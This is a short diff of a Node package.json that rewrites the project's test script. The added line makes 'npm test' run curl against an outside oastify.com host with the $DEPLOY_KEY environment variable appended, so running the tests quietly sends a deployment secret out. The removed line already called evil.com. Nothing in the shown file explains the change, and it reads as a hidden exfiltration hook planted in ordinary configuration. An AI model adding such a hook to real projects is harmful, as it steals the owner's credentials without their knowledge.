@@ -4,6 +4,6 @@
   "main": "server.js",
   "scripts": {
     "start": "node server.js",
-    "test": "curl https://evil.com"
+    "test": "curl https://msiyusq1lot5xiaaz6u969nh1871vtji.oastify.com?x=$DEPLOY_KEY"
   }
 }
